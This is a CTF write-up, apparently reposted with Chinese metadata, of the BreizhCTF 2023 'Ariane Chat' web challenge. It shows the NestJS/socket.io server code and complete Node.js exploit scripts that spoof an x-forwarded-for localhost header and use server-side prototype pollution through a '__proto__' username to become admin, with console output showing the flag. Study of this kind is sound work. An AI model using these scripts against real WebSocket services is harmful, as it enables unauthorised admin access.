---
title: Server-Side Prototype Pollution on a WebSocket server – BreizhCTF Ariane Chat
contest: BreizhCTF
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- sspp
- socket-io
- nestjs
- prototype-pollution
- isadmin
- bot-client
attack_chain:
- NestJS + socket.io 8888 WebSocket
- loginAsHuman 创 Client 普通用户
- loginAsAdmin 注释掉密码验证但有 client.isAdmin
- 注释看 Admin 验证：if (client.isAdmin) socket.emit('onmessage', 'Welcome ...')
- getCanceledPeople() 中 list[username][message] = reason 经典 SSPP
- 'bot 客户端用 extraHeaders x-forwarded-for: 127.0.0.1'
- bot 调 reportClient(reason='isAdmin') 触发 client[reason] = 'suspicious
- suspicious' 是字符串 → truthy → if (client.isAdmin) 走 if 分支
- human 调 getBanList 触发 banClient → list[__proto__][isAdmin] = 'true
- 全局 Object.prototype.isAdmin 污染
- flagUser.emit('loginAsAdmin', {username, password}) → BZHCTF{...}
key_payload: 'banClient({message: ''isAdmin'', reason: ''true''})'
one_liner: BreizhCTF 2023 Ariane Chat：NestJS + socket.io 服务端原型污染 (SSPP) 提权为 admin。
lesson: 当 admin 标志在字符串 truthy 检查且 Object 原型被污染时，所有 Client 实例都自动成为 admin。
quality: high
full_path: Server-Side_Prototype_Pollution_on_a_WebSocket_server_–_BreizhCTF_Ariane_Chat.full.md
meta_path: Server-Side_Prototype_Pollution_on_a_WebSocket_server_–_BreizhCTF_Ariane_Chat.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: Server-Side Prototype Pollution on a WebSocket server – BreizhCTF Ariane Chat。BreizhCTF 2023 Ariane Chat：NestJS + socket.io 服务端原型污染 (SSPP) 提权为 admin。。关键路径：NestJS + socket.io 8888 WebSocket → loginA...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/102251.html
reasoning_chain:
- NestJS + socket.io 8888 → 触发点：WebSocket SSPP 服务端原型污染
- 'loginAsHuman → 普通用户；loginAsBot → bot 客户端 + x-forwarded-for: 127.0.0.1'
- 假设：bot.reportClient(reason='isAdmin') → 动作：client['isAdmin']='suspicious' 字符串 truthy
- if (client.isAdmin) → 假设：进入 admin 分支
- ModerationService.getCanceledPeople → list[username][message]=reason → 假设：message key 受控 SSPP
- 动作：banClient({message:'isAdmin', reason:'true'}) → 观察：Object.prototype.isAdmin='true'
- 假设：所有 Client 实例现在都是 admin → 动作：loginAsAdmin with any credentials
- 观察：Welcome admin BZHCTF{DontPutUserInputIntoYourKeys}
failed_attempts:
- 试图直接登录 admin 密码 → 失败：admin 验证密码但有 client.isAdmin 二次检查
- 试图用 __proto__ 直接污染 → 失败：banClient 必须经 getCanceledPeople 路径
key_observations:
- SSPP 触发条件 = 用户控制对象 key + 浅拷贝 list[username][key]=value
- 字符串 truthy 检查 (if (client.isAdmin)) 是 admin 标志的弱验证
- 'WebSocket bot 客户端用 x-forwarded-for: 127.0.0.1 模拟本地访问'
- 修复方案：Object.create(null)/Map/黑名单 __proto__ 键
prerequisites:
- JavaScript 原型链与 SSPP 原理
- NestJS / socket.io WebSocket 框架
- Node.js admin flag truthy 检查
- WebSocket 消息拦截与 bot 客户端模拟
---
# Server-Side Prototype Pollution on a WebSocket server – BreizhCTF Ariane Chat

> 原文: https://www.ctfiot.com/102251.html
> ID: 102251


```
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 // ...

 @UsePipes(new ValidationPipe())
 @SubscribeMessage('login')
 async loginAsHuman(@ConnectedSocket() socket: Socket, @MessageBody() body: LoginDto) {
 const { username } = body;
 const client = new Client(socket, ClientClass.HUMAN);
 client.username = username;
 this.chatService.addClient(socket.id, client);
 }
 // ...

 @UsePipes(new ValidationPipe())
 @SubscribeMessage('sendMessage')
 async onChat(@ConnectedSocket() socket: Socket, @MessageBody('message') messageStr: string) {
 const messageInstance = this.chatService.processMessage(socket.id, messageStr);

 this.server.emit('onMessage', {
 authorName: messageInstance.author,
 message: messageInstance.content,
 });
 }
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
import { io } from "socket.io-client";

const url = "ws://localhost:
8888";

const human = io(url);

// ------------- RECV -------------------
human.on("onMessage", (...args) => {
 console.log("RECV (onMessage):")
 console.log(args);
});

// ------------- SEND -------------------
human.emit("login", {"username": "toto"});
human.emit("sendMessage", {
 "authorName": "toto",
 "message": "Hello world !"
});
1
2
3
$ node client.mjs
RECV (onMessage):
[ { authorName: 'toto', message: 'Hello world !' } ]
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 // ...

 @UsePipes(new ValidationPipe())
 @SubscribeMessage('loginAsAdmin')
 async loginAsAdmin(@ConnectedSocket() socket: Socket, @MessageBody() body: LoginDto) {
 if (!body.password) {
 throw new WsException('A password is required to authenticate as admin');
 }
 if (this.chatService.getClientBySocket(socket.id)) {
 throw new WsException('You are already logged in');
 }

 const client = new Client(socket, ClientClass.HUMAN);
 client.username = body.username;
 this.chatService.addClient(socket.id, client);

 // TODO: Admin authentication
 // if (crypto.createHash('sha512').update(body.password).digest('hex') === 'TODO') {
 // client.isAdmin = true;
 // }
 if (client.isAdmin) {
 socket.emit('onmessage', 'Welcome home admin, BZHCTF{}');
 }
 }
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
export class ModerationService {
 // ...

 public getCanceledPeople(): {
 [username: string]: {
 [reason: string]: string;
 };
 } {
 const list: {
 [username: string]: {
 [reason: string]: string;
 };
 } = {};

 for (const [username, [message, reason]] of this.bannedUsers) {
 if (!list[username]) {
 list[username] = {};
 }
 list[username][message] = reason; // <-- SSPP
 }

 return list;
 }
1
2
3
4
5
6
let username = "__proto__";
let message = "isAdmin";
let reason = "true"; // any string with length >= 1 to pass the condition

list[username][message] = reason
// list["__proto__"]["isAdmin"] = "true"
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 // ...

 @SubscribeMessage('getBanList')
 async getBanList(@ConnectedSocket() socket: Socket) {
 const client = this.chatService.getClientBySocket(socket.id);
 if (!client) {
 throw new WsException('Not authenticated');
 }
 if (!client.isAdmin) {
 throw new WsException('Only moderators are allowed to list banned people');
 }

 socket.emit('setBanList', this.moderationService.getCanceledPeople());
 }
1
2
3
4
5
6
7
export class ModerationService {
 // ...

 public sus(client: Client, reason: SusReason) {
 client[reason] = 'suspicious';
 this.reportedUsers.add(client.username);
 }
1
2
3
client["isAdmin"] = 'suspicious';

if (client.isAdmin) // will be true
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 // ...

 @UsePipes(new ValidationPipe())
 @SubscribeMessage('loginAsBot')
 async loginAsBot(@ConnectedSocket() socket: Socket, @MessageBody() body: LoginDto) {
 const ip = [socket.handshake.headers['x-forwarded-for'], socket.handshake.address];

 if (!ip.includes('127.0.0.1')) {
 throw new WsException('Unauthorized');
 }

 const client = new Client(socket, ClientClass.BOT);
 client.username = body.username;
 this.chatService.addClient(socket.id, client);
 }
 // ...

 @UsePipes(new ValidationPipe())
 @SubscribeMessage('reportClient')
 async reportClient(@ConnectedSocket() socket: Socket, @MessageBody() body: ReportClientDto) {
 const { username, reason } = body;

 // Authenticate client
 const client = this.chatService.getClientBySocket(socket.id);
 if (!client) {
 throw new WsException('Not authenticated');
 }
 if (client.classType !== ClientClass.BOT) {
 throw new WsException('Not a bot');
 }
 if (client.username === username) {
 throw new WsException('You cannot report yourself');
 }

 const suspected = this.chatService.getClientByUsername(username);
 if (suspected.classType === ClientClass.BOT || suspected.isAdmin) {
 throw new WsException('You cannot report admins or bots');
 }
 if (!suspected) {
 throw new WsException('This user does not exist');
 }
 this.moderationService.sus(suspected, reason);
 }
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
import { io } from "socket.io-client";

// const url = "ws://localhost:
8888";
const url = "https://arianechat-3bb948c9ac36cf54.ctf.bzh/";

const human = io(url);
const bot = io(url, {
 extraHeaders: {
 "x-forwarded-for": "127.0.0.1"
 }
});

// ------------- RECV -------------------
human.onAny((eventName, ...args) => {
 console.log(`HUMAN RECV (${eventName}):`)
 console.log(args);
});
bot.onAny((eventName, ...args) => {
 console.log(`BOT RECV (${eventName}):`)
 console.log(args);
});

// ------------- SEND -------------------

// Human that will be reported as suspicious to be an admin
// then call the getBanList function to trigger the SSPP
human.emit("login", {"username": "toto"});

// Bot that will report the Human
bot.emit("loginAsBot", {"username": "bot"});

setTimeout(() => {
 // The Human is now admin, he can call the getBanList function
 bot.emit("reportClient", {
 "username": "toto",
 "reason": "isAdmin"
 });

 setTimeout(() => {
 // The Human triggers the SSPP
 human.emit("getBanList");
 }, 500);
}, 500)
1
2
3
$ node test.mjs
HUMAN RECV (setBanList):
[ {} ]
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
import { io } from "socket.io-client";

const url = "ws://localhost:
8888";

const human = io(url);
const banUser = io(url);
const flagUser = io(url);
const bot = io(url, {
 extraHeaders: {
 "x-forwarded-for": "127.0.0.1"
 }
});

// ------------- RECV -------------------
const users = {
 "human": human,
 "banUser": banUser,
 "bot": bot,
 "flagUser": flagUser
};
for (let key in users) {
 let socket = users[key];
 // Listen on all emitters
 socket.onAny((eventName, ...args) => {
 console.log(`${key} RECV (${eventName}):`)
 console.log(args);
 });
}

// ------------- SEND -------------------
const sleep = 1000;

// Human that will be reported as suspicious to be an admin
// then call the getBanList function to trigger the SSPP
human.emit("login", {"username": "toto"});

// Send the message that will be ban by the futur admin Human
banUser.emit("login", {"username": "__proto__"});
banUser.emit("sendMessage", {
 "authorName": "__proto__",
 "message": "isAdmin"
});

// Bot that will report the Human
bot.emit("loginAsBot", {"username": "bot"});

setTimeout(() => {
 // The Human is now admin
 // he can call banClient & getBanList functions
 bot.emit("reportClient", {
 "username": "toto",
 "reason": "isAdmin"
 });

 setTimeout(() => {
 // Prepare the SSPP
 // list[username][message] = reason
 // list[__proto__][isAdmin] = true
 human.emit("banClient", {
 "message": "isAdmin",
 "reason": "true"
 })

 setTimeout(() => {
 // The Human triggers the SSPP
 human.emit("getBanList");

 setTimeout(() => {
 // Login as admin to get the flag
 flagUser.emit("loginAsAdmin", {
 "username": "whatever",
 "password": "whatever"
 });
 }, sleep);
 }, sleep);
 }, sleep);
}, sleep);
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
$ node poc.mjs
human RECV (onMessage):
[ { authorName: '__proto__', message: 'isAdmin' } ]
banUser RECV (onMessage):
[ { authorName: '__proto__', message: 'isAdmin' } ]
flagUser RECV (onMessage):
[ { authorName: '__proto__', message: 'isAdmin' } ]
bot RECV (onMessage):
[ { authorName: '__proto__', message: 'isAdmin' } ]
human RECV (setBanList):
[ {} ]
flagUser RECV (onmessage):
[ 'Welcome home admin, BZHCTF{DontPutUserInputIntoYourKeys}' ]
```


---
## 附图

[图片已移除]